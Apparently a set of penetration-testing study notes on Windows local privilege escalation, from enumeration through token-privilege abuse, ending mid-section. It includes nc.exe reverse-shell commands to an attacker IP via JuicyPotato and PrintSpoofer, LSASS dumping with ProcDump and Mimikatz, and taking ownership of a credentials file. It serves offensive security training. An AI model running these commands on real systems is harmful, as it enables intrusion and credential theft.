# Getting the Lay of the Land

## 1.Situational Awareness

## Network Information

### **Interface(s), IP Address(es), DNS Information**

```cmd-session
ipconfig /all
```

### **ARP Table**

```cmd-session
arp -a
```

### **Routing Table**

```cmd-session
route print
```

## Enumerating Protections

### **Check Windows Defender Status**

```powershell-session
Get-MpComputerStatus
```

### **List AppLocker Rules**

```powershell-session
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

### **Test AppLocker Policy**

```powershell-session
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```

***

## 2.Initial Enumeration

|                                                                                                                                                                                                                                                                                                   |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| The highly privileged `NT AUTHORITY\SYSTEM` account, or [LocalSystem](https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account) account which is a highly privileged account with more privileges than a local administrator account and is used to run most Windows services. |
| The built-in local `administrator` account. Some organizations disable this account, but many do not. It is not uncommon to see this account reused across multiple systems in a client environment.                                                                                              |
| Another local account that is a member of the local `Administrators` group. Any account in this group will have the same privileges as the built-in `administrator` account.                                                                                                                      |
| A standard (non-privileged) domain user who is part of the local `Administrators` group.                                                                                                                                                                                                          |
| A domain admin (highly privileged in the Active Directory environment) that is part of the local `Administrators` group.                                                                                                                                                                          |

## Key Data Points

> OS name
>
> Version
>
> Running Services

## System Information

### **Tasklist**

```cmd-session
tasklist /svc
```

### **Display All Environment Variables**

> If a file is placed in `USERPROFILE\AppData\Microsoft\Windows\Start Menu\Programs\Startup`, when the user logs into a different machine, this file will execute.

```cmd-session
C:\adip> set
```

### **View Detailed Configuration Information**

```cmd-session
systeminfo
```

### **Patches and Updates**

```powershell
wmic qfe

# Powershell version
Get-HotFix | ft -AutoSize
```

### **Installed Programs**

```powershell
wmic product get name

# Powershell
Get-WmiObject -Class Win32_Product |  select Name, Version
```

### **Display Running Processes**

> &#x20;[netstat](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/netstat) command will display active TCP and UDP connections which will give us a better idea of what services are listening on which port(s) both locally and accessible to the outside. We may find a vulnerable service only accessible to the local host (when logged on to the host) that we can exploit to escalate privileges.

```cmd-session
netstat -ano
```

## User & Group Information

### **Logged-In Users**

```cmd-session
query user
```

### **Current User**

```cmd-session
 echo %USERNAME%
```

### **Current User Privileges**

```cmd-session
whoami /priv
```

### **Current User Group Information**

```cmd-session
whoami /groups
```

### **Get All Users**

```cmd-session
net user
```

### **Get All Groups**

```cmd-session
 net localgroup
```

### **Details About a Group**

```cmd-session
net localgroup administrators
```

### **Get Password Policy & Other Account Information**

```cmd-session
net accounts
```

> <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md>

***

## 3.Communication with Processes

## Enumerating Network Services

> The most common way people interact with processes is through a network socket (DNS, HTTP, SMB, etc.). The [netstat](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/netstat) command will display active TCP and UDP connections which will give us a better idea of what services are listening on which port(s) both locally and accessible to the outside. We may find a vulnerable service only accessible to the localhost (when logged on to the host) that we can exploit to escalate privileges.

### **Display Active Network Connections**

```cmd-session
netstat -ano
```

> The main thing to look for with Active Network Connections are entries listening on loopback addresses (`127.0.0.1` and `::1`) that are not listening on the IP Address (`10.129.43.8`) or broadcast (`0.0.0.0`, `::/0`). The reason for this is network sockets on localhost are often insecure due to the thought that "they aren't accessible to the network." The one that sticks out immediately will be port `14147`, which is used for FileZilla's administrative interface. By connecting to this port, it may be possible to extract FTP passwords in addition to creating an FTP Share at c:\ as the FileZilla Server user (potentially Administrator).

**More Examples**

> One of the best examples of this type of privilege escalation is the `Splunk Universal Forwarder`, installed on endpoints to send logs into Splunk. The default configuration of Splunk did not have any authentication on the software and allowed anyone to deploy applications, which could lead to code execution. Again, the default configuration of Splunk was to run it as SYSTEM$ and not a low privilege user. For more information, check out [Splunk Universal Forwarder Hijacking](https://airman604.medium.com/splunk-universal-forwarder-hijacking-5899c3e0e6b2) and [SplunkWhisperer2](https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/).
>
> Another overlooked but common local privilege escalation vector is the `Erlang Port` (25672). Erlang is a programming language designed around distributed computing and will have a network port that allows other Erlang nodes to join the cluster. The secret to join this cluster is called a cookie. Many applications that utilize Erlang will either use a weak cookie (RabbitMQ uses `rabbit` by default) or place the cookie in a configuration file that is not well protected. Some example Erlang applications are SolarWinds, RabbitMQ, and CouchDB. For more information check out the [Erlang-arce blogpost from Mubix](https://malicious.link/post/2018/erlang-arce/)

## **More on Named Pipes**

* <https://learn.microsoft.com/en-us/sysinternals/downloads/pipelist><br>

### **Listing Named Pipes with Pipelist**

```cmd-session
pipelist.exe /accepteula
```

> Additionally, we can use PowerShell to list named pipes using `gci` (`Get-ChildItem`)

### **Listing Named Pipes with PowerShell**

```powershell-session
 gci \\.\pipe\
```

### **Reviewing LSASS Named Pipe Permissions**

<pre class="language-cmd-session"><code class="lang-cmd-session">.\accesschk.exe /accepteula \pipe\
<strong>accesschk.exe /accepteula \\.\Pipe\lsass -v
</strong></code></pre>

## Named Pipes Attack Example

* <https://www.exploit-db.com/exploits/48021>

> Using `accesschk` we can search for all named pipes that allow write access with a command such as `accesschk.exe -w \pipe\* -v` and notice that the `WindscribeService` named pipe allows `READ` and `WRITE` access to the `Everyone` group, meaning all authenticated users.

```
accesschk.exe -w \pipe\* -v 
```

### **Checking WindscribeService Named Pipe Permissions**

> Confirming with `accesschk` we see that the Everyone group does indeed have `FILE_ALL_ACCESS` (All possible access rights) over the pipe.

```cmd-session
accesschk.exe -accepteula -w \pipe\WindscribeService -v
```

> From here, we could leverage these lax permissions to escalate privileges on the host to SYSTEM.


# Attacking Windows User Privileges

## 1.Windows Privileges Overview

## Windows Authorization Process

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F9AOAaLru7GHQFwNc76G7%2Fimage.png?alt=media&amp;token=5ae861e8-a0c1-4c0d-9101-b37ea385b59e" alt=""><figcaption></figcaption></figure>

## &#x20;Rights and Privileges in Windows

> Windows contains many groups that grant their members powerful rights and privileges. Many of these can be abused to escalate privileges on both a standalone Windows host and within an Active Directory domain environment. Ultimately, these may be used to gain Domain Admin, local administrator, or SYSTEM privileges on a Windows workstation, server, or Domain Controller (DC). Some of these groups are listed below.

| **Group**                   | **Description**                                                                                                                                                                                                                                                                                                                                                                                               |
| --------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Default Administrators      | Domain Admins and Enterprise Admins are "super" groups.                                                                                                                                                                                                                                                                                                                                                       |
| Server Operators            | Members can modify services, access SMB shares, and backup files.                                                                                                                                                                                                                                                                                                                                             |
| Backup Operators            | Members are allowed to log onto DCs locally and should be considered Domain Admins. They can make shadow copies of the SAM/NTDS database, read the registry remotely, and access the file system on the DC via SMB. This group is sometimes added to the local Backup Operators group on non-DCs.                                                                                                             |
| Print Operators             | Members can log on to DCs locally and "trick" Windows into loading a malicious driver.                                                                                                                                                                                                                                                                                                                        |
| Hyper-V Administrators      | If there are virtual DCs, any virtualization admins, such as members of Hyper-V Administrators, should be considered Domain Admins.                                                                                                                                                                                                                                                                           |
| Account Operators           | Members can modify non-protected accounts and groups in the domain.                                                                                                                                                                                                                                                                                                                                           |
| Remote Desktop Users        | Members are not given any useful permissions by default but are often granted additional rights such as `Allow Login Through Remote Desktop Services` and can move laterally using the RDP protocol.                                                                                                                                                                                                          |
| Remote Management Users     | Members can log on to DCs with PSRemoting (This group is sometimes added to the local remote management group on non-DCs).                                                                                                                                                                                                                                                                                    |
| Group Policy Creator Owners | Members can create new GPOs but would need to be delegated additional permissions to link GPOs to a container such as a domain or OU.                                                                                                                                                                                                                                                                         |
| Schema Admins               | Members can modify the Active Directory schema structure and backdoor any to-be-created Group/GPO by adding a compromised account to the default object ACL.                                                                                                                                                                                                                                                  |
| DNS Admins                  | Members can load a DLL on a DC, but do not have the necessary permissions to restart the DNS server. They can load a malicious DLL and wait for a reboot as a persistence mechanism. Loading a DLL will often result in the service crashing. A more reliable way to exploit this group is to [create a WPAD record](https://web.archive.org/web/20231115070425/https://cube0x0.github.io/Pocing-Beyond-DA/). |

## User Rights Assignment

> Depending on group membership, and other factors such as privileges assigned via domain and local Group Policy, users can have various rights assigned to their account. This Microsoft article on [User Rights Assignment](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/user-rights-assignment) provides a detailed explanation of each of the user rights that can be set in Windows as well as security considerations applicable to each right. Below are some of the key user rights assignments, which are settings applied to the localhost. These rights allow users to perform tasks on the system such as logon locally or remotely, access the host from the network, shut down the server, etc.

| Setting [Constant](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants) | Setting Name                                                                                                                                                                                                 | Standard Assignment                                     | Description                                                                                                                                                                                                                                                                                                                                                                                                                          |
| ----------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| SeNetworkLogonRight                                                                             | [Access this computer from the network](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/access-this-computer-from-the-network)                                  | Administrators, Authenticated Users                     | Determines which users can connect to the device from the network. This is required by network protocols such as SMB, NetBIOS, CIFS, and COM+.                                                                                                                                                                                                                                                                                       |
| SeRemoteInteractiveLogonRight                                                                   | [Allow log on through Remote Desktop Services](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/allow-log-on-through-remote-desktop-services)                    | Administrators, Remote Desktop Users                    | This policy setting determines which users or groups can access the login screen of a remote device through a Remote Desktop Services connection. A user can establish a Remote Desktop Services connection to a particular server but not be able to log on to the console of that same server.                                                                                                                                     |
| SeBackupPrivilege                                                                               | [Back up files and directories](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/back-up-files-and-directories)                                                  | Administrators                                          | This user right determines which users can bypass file and directory, registry, and other persistent object permissions for the purposes of backing up the system.                                                                                                                                                                                                                                                                   |
| SeSecurityPrivilege                                                                             | [Manage auditing and security log](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/manage-auditing-and-security-log)                                            | Administrators                                          | This policy setting determines which users can specify object access audit options for individual resources such as files, Active Directory objects, and registry keys. These objects specify their system access control lists (SACL). A user assigned this user right can also view and clear the Security log in Event Viewer.                                                                                                    |
| SeTakeOwnershipPrivilege                                                                        | [Take ownership of files or other objects](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects)                            | Administrators                                          | This policy setting determines which users can take ownership of any securable object in the device, including Active Directory objects, NTFS files and folders, printers, registry keys, services, processes, and threads.                                                                                                                                                                                                          |
| SeDebugPrivilege                                                                                | [Debug programs](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs)                                                                                | Administrators                                          | This policy setting determines which users can attach to or open any process, even a process they do not own. Developers who are debugging their applications do not need this user right. Developers who are debugging new system components need this user right. This user right provides access to sensitive and critical operating system components.                                                                           |
| SeImpersonatePrivilege                                                                          | [Impersonate a client after authentication](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication)                          | Administrators, Local Service, Network Service, Service | This policy setting determines which programs are allowed to impersonate a user or another specified account and act on behalf of the user.                                                                                                                                                                                                                                                                                          |
| SeLoadDriverPrivilege                                                                           | [Load and unload device drivers](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/load-and-unload-device-drivers)                                                | Administrators                                          | This policy setting determines which users can dynamically load and unload device drivers. This user right is not required if a signed driver for the new hardware already exists in the driver.cab file on the device. Device drivers run as highly privileged code.                                                                                                                                                                |
| SeRestorePrivilege                                                                              | [Restore files and directories](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/restore-files-and-directories)                                                  | Administrators                                          | This security setting determines which users can bypass file, directory, registry, and other persistent object permissions when they restore backed up files and directories. It determines which users can set valid security principals as the owner of an object.                                                                                                                                                                 |
| SeTcbPrivilege                                                                                  | [Act as part of the operating system](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/act-as-part-of-the-operating-system) | Administrators, Local Service, Network Service, Service | This security setting determines whether a process can assume the identity of any user and, through this, obtain access to resources that the targeted user is permitted to access (impersonation). This may be assigned to antivirus or backup tools that need the ability to access all system files for scans or backups. This privilege should be reserved for service accounts requiring this access for legitimate activities. |

> Further information can be found [here](https://4sysops.com/archives/user-rights-assignment-in-windows-server-2016/).
>
> Typing the command `whoami /priv` will give you a listing of all user rights assigned to your current user. Some rights are only available to administrative users and can only be listed/leveraged when running an elevated cmd or PowerShell session. These concepts of elevated rights and [User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) are security features introduced with Windows Vista to default to restricting applications from running with full permissions unless necessary. If we compare and contrast the rights available to us as an admin in a non-elevated console vs. an elevated console, we will see that they differ drastically.
>
> Below are the rights available to a local administrator account on a Windows system.

## **Local Admin User Rights - Elevated**

```powershell-session
PS C:\htb> whoami 

winlpe-srv01\administrator

PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Disabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
```

> When a privilege is listed for our account in the `Disabled` state, it means that our account has the specific privilege assigned. Still, it cannot be used in an access token to perform the associated actions until it is enabled. Windows does not provide a built-in command or PowerShell cmdlet to enable privileges, so we need some scripting to help us out. We will see ways to abuse various privileges throughout this module and various ways to enable specific privileges within our current process. One example is this PowerShell [script](https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1) which can be used to enable certain privileges, or this [script](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/) which can be used to adjust token privileges.
>
> A standard user, in contrast, has drastically fewer rights.

### **Standard User Rights**

```powershell-session
whoami

PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

> User rights increase based on the groups they are placed in or their assigned privileges. Below is an example of the rights granted to users in the `Backup Operators` group. Users in this group do have other rights that UAC currently restricts. Still, we can see from this command that they have the [SeShutdownPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/shut-down-the-system), which means that they can shut down a domain controller that could cause a massive service interruption should they log onto a domain controller locally (not via RDP or WinRM)

### **Backup Operators Rights**

```powershell-session
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

## Detection

> This [post](https://blog.palantir.com/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e) is worth a read for more information on Windows privileges as well as detecting and preventing abuse, specifically by logging event [4672: Special privileges assigned to new logon](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4672) which will generate an event if certain sensitive privileges are assigned to a new logon session. This can be fine-tuned in many ways, such as by monitoring privileges that should *never* be assigned or those that should only ever be assigned to specific accounts.

***

## 2.SeImpersonate and SeAssignPrimaryToken

* <https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw>
* <https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt>

## SeImpersonate - JuicyPotato

### **Connecting with MSSQLClient.py**

```shell-session
mssqlclient.py sql_dev@10.129.43.30 -windows-auth
```

### **Enabling xp\_cmdshell**

```shell-session
SQL> enable_xp_cmdshell
```

> Note: We don't actually have to type `RECONFIGURE` as Impacket does this for us.

### **Confirming Access**

```shell-session
SQL> xp_cmdshell whoami
```

### **Checking Account Privileges**

```shell-session
SQL> xp_cmdshell whoami /priv
```

> The command `whoami /priv` confirms that [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege) is listed. This privilege can be used to impersonate a privileged account such as `NT AUTHORITY\SYSTEM`. [JuicyPotato](https://github.com/ohpe/juicy-potato) can be used to exploit the `SeImpersonate` or `SeAssignPrimaryToken` privileges via DCOM/NTLM reflection abuse.

### **Escalating Privileges Using JuicyPotato**

```shell-session
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```

### **Catching SYSTEM Shell**

```shell-session
sudo nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 50332
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.


C:\Windows\system32>whoami

whoami
nt authority\system


C:\Windows\system32>hostname

hostname
WINLPE-SRV01
```

***

## PrintSpoofer and RoguePotato

> JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. However, [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and [RoguePotato](https://github.com/antonioCoco/RoguePotato) can be used to leverage the same privileges and gain `NT AUTHORITY\SYSTEM` level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.

### **Escalating Privileges using PrintSpoofer**

```shell-session
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```

### **Catching Reverse Shell as SYSTEM**

```shell-session
nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 49847
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.


C:\Windows\system32>whoami

whoami
nt authority\system
```

***

## 3.SeDebugPrivilege

> &#x20;This privilege can be assigned via local or domain group policy, under `Computer Settings > Windows Settings > Security Settings`.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F3vp2N8VOqF7FdBq1LofB%2Fimage.png?alt=media&amp;token=b5b62577-4de2-4d9c-898a-166bf396b701" alt=""><figcaption></figcaption></figure>

> After logging on as a user assigned the `Debug programs` right and opening an elevated shell, we see `SeDebugPrivilege` is listed.

```cmd-session
C:\adip> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeDebugPrivilege                          Debug programs                                                     Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set    
```

> We can use [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) from the [SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) suite to leverage this privilege and dump process memory. A good candidate is the Local Security Authority Subsystem Service ([LSASS](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)) process, which stores user credentials after a user logs on to a system.

```cmd-session
C:\adip> procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

> This is successful, and we can load this in `Mimikatz` using the `sekurlsa::minidump` command. After issuing the `sekurlsa::logonPasswords` commands, we gain the NTLM hash of the local administrator account logged on locally. We can use this to perform a pass-the-hash attack to move laterally if the same local administrator password is used on one or multiple additional systems (common in large organizations).\
> \
> Note: It is always a good idea to type "log" before running any commands in "Mimikatz" this way all command output will put output to a ".txt" file. This is especially useful when dumping credentials from a server which may have many sets of credentials in mem

```cmd-session
C:\adip> mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

## What if we can't load tools but we have RDP Access

> Suppose we are unable to load tools on the target for whatever reason but have RDP access. In that case, we can take a manual memory dump of the `LSASS` process via the Task Manager by browsing to the `Details` tab, choosing the `LSASS` process, and selecting `Create dump file`. After downloading this file back to our attack system, we can process it using Mimikatz the same way as the previous example.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FfBr6NP4fyNnD6uZvl3Fu%2Fimage.png?alt=media&amp;token=ce7fed21-2209-43ef-86de-17b241ac6db4" alt=""><figcaption></figcaption></figure>

### Remote Code Execution as SYSTEM

* <https://decoder.cloud/2018/02/02/getting-system/>
* <https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1>

> First, transfer this [PoC script](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1) over to the target system. Next we just load the script and run it with the following syntax `[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")`. Note that we must add a third blank argument `""` at the end for the PoC to work properly.<br>
>
> &#x20;The PoC script has received an update. Please visit its GitHub repository and review its usage. <https://github.com/decoder-it/psgetsystem>

```powershell-session
PS C:\htb> tasklist 
```

> Here we can target `winlogon.exe` running under PID 612, which we know runs as SYSTEM on Windows hosts.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FRlEB2f6taEIVz3cel9bG%2Fimage.png?alt=media&amp;token=6059d0cf-8281-4fbe-90c5-9db6dcb9d2eb" alt=""><figcaption></figcaption></figure>

> We could also use the [Get-Process](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-process?view=powershell-7.2) cmdlet to grab the PID of a well-known process that runs as SYSTEM (such as LSASS) and pass the PID directly to the script, cutting down on the number of steps required.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FLCXniccKzP6XMQeai34Z%2Fimage.png?alt=media&amp;token=51abb94c-9349-4cc0-95d0-0a07a5a41cbf" alt=""><figcaption></figcaption></figure>

> <https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC>
>
> \
> Other tools such as [this one](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC) exist to pop a SYSTEM shell when we have `SeDebugPrivilege`. Often we will not have RDP access to a host, so we'll have to modify our PoCs to either return a reverse shell to our attack host as SYSTEM or another command, such as adding an admin user. Play around with these PoCs and see what other ways you can achieve SYSTEM access, especially if you do not have a fully interactive session, such as when you achieve command injection or have a web shell or reverse shell connection as the user with `SeDebugPrivilege`. Keep these examples in mind in case you ever run into a situation where dumping LSASS does not result in any useful credentials (though we can get SYSTEM access with just the machine NTLM hash, but that's outside the scope of this module) and a shell or RCE as SYSTEM would be beneficial.

***

## 4.SeTakeOwnershipPrivilege

> [SeTakeOwnershipPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects) grants a user the ability to take ownership of any "securable object," meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes. This privilege assigns [WRITE\_OWNER](https://docs.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights) rights over an object, meaning the user can change the owner within the object's security descriptor. Administrators are assigned this privilege by default. While it is rare to encounter a standard user account with this privilege, we may encounter a service account that, for example, is tasked with running backup jobs and VSS snapshots assigned this privilege. It may also be assigned a few others such as `SeBackupPrivilege`, `SeRestorePrivilege`, and `SeSecurityPrivilege` to control this account's privileges at a more granular level and not granting the account full local admin rights. These privileges on their own could likely be used to escalate privileges. Still, there may be times when we need to take ownership of specific files because other methods are blocked, or otherwise, do not work as expected. Abusing this privilege is a bit of an edge case. Still, it is worth understanding in-depth, especially since we may also find ourselves in a scenario in an Active Directory environment where we can assign this right to a specific user that we can control and leverage it to read a sensitive file on a file share.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FRlY2xUkQotXWOsUWRrVA%2Fimage.png?alt=media&amp;token=eb613fcd-16c2-43af-b9b7-355ab4717f5b" alt=""><figcaption></figcaption></figure>

> The setting can be set in Group Policy under:
>
> * `Computer Configuration` ⇾ `Windows Settings` ⇾ `Security Settings` ⇾ `Local Policies` ⇾ `User Rights Assignment`

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FT34FwQmMq6HKlX8JLT3n%2Fimage.png?alt=media&amp;token=c6fe6943-b2b8-4d1f-89cd-e0dfaed0073c" alt=""><figcaption></figcaption></figure>

> With this privilege, a user could take ownership of any file or object and make changes that could involve access to sensitive data, `Remote Code Execution` (`RCE`) or `Denial-of-Service` (DOS).
>
> Suppose we encounter a user with this privilege or assign it to them through an attack such as GPO abuse using [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse). In that case, we could use this privilege to potentially take control of a shared folder or sensitive files such as a document containing passwords or an SSH key.

## Leveraging the Privilege

### **Reviewing Current User Privileges**

```powershell-session
PS C:\adip> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                              State
============================= ======================================================= ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                                Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                          Disabled
```

### **Enabling SeTakeOwnershipPrivilege**

> Notice from the output that the privilege is not enabled. We can enable it using this [script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) which is detailed in [this](https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/) blog post, as well as [this](https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77) one which builds on the initial concept.

```powershell-session
PS C:\adip> Import-Module .\Enable-Privilege.ps1
PS C:\adip> .\EnableAllTokenPrivs.ps1
PS C:\adip> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
```

### **Choosing a Target File**

> Next, choose a target file and confirm the current ownership. For our purposes, we'll target an interesting file found on a file share. It is common to encounter file shares with `Public` and `Private` directories with subdirectories set up by department. Given a user's role in the company, they can often access specific files/directories. Even with a structure like this, a sysadmin may misconfigure permissions on directories and subdirectories, making file shares a rich source of information for us once we have obtained Active Directory credentials (and sometimes even without needing credentials). For our scenario, let's assume that we have access to the target company's file share and can freely browse both the `Private` and `Public` subdirectories. For the most part, we find that permissions are set up strictly, and we have not found any interesting information on the `Public` portion of the file share. In browsing the `Private` portion, we find that all Domain Users can list the contents of certain subdirectories but get an `Access denied` message when trying to read the contents of most files. We find a file named `cred.txt` under the `IT` subdirectory of the `Private` share folder during our enumeration.
>
> Given that our user account has `SeTakeOwnershipPrivilege` (which may have already been granted), or we exploit some other misconfiguration such as an overly permissive Group Policy Object (GPO) to grant our user account that privilege) we can leverage it to read any file of our choosing.

> Note: Take great care when performing a potentially destructive action like changing file ownership, as it could cause an application to stop working or disrupt user(s) of the target object. Changing the ownership of an important file, such as a live web.config file, is not something we would do without consent from our client first. Furthermore, changing ownership of a file buried down several subdirectories (while changing each subdirectory permission on the way down) may be difficult to revert and should be avoided.

**Let's check out our target file to gather a bit more information about it.**

```powershell-session
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
```

### **Checking File Ownership**

```powershell-session
